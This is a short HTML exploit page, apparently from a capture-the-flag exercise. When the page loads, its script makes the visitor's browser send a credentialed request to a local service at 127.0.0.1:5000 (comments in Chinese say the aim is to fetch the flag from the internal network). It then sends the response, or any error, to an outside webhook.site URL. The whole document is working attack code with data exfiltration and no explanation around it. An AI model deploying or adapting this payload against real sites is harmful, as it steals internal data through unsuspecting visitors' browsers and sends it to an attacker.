<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Launching SSRF Exploit...</h1>
    <script>
        (async () => {
            const WEBHOOK_URL = 'https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63';
            const SSRF_URL = 'http://127.0.0.1:5000/search?q=AIS3';

            try {
                // 發 SSRF 請求，從內網拿 flag
                const res = await fetch(SSRF_URL, { credentials: 'include' });
                const data = await res.json();

                // 打包敏感結果到 webhook
                const leakUrl = `${WEBHOOK_URL}?leak=${encodeURIComponent(JSON.stringify(data))}`;
                await fetch(leakUrl);

                document.body.innerHTML += '<p>Exploit sent! Check your webhook.</p>';
            } catch (err) {
                console.error('Exploit error:', err);
                document.body.innerHTML += `<p>Exploit failed: ${err}</p>`;
                // 回報失敗到 webhook
                await fetch(`${WEBHOOK_URL}?error=${encodeURIComponent(err.toString())}`);
            }
        })();
    </script>
</body>
</html>
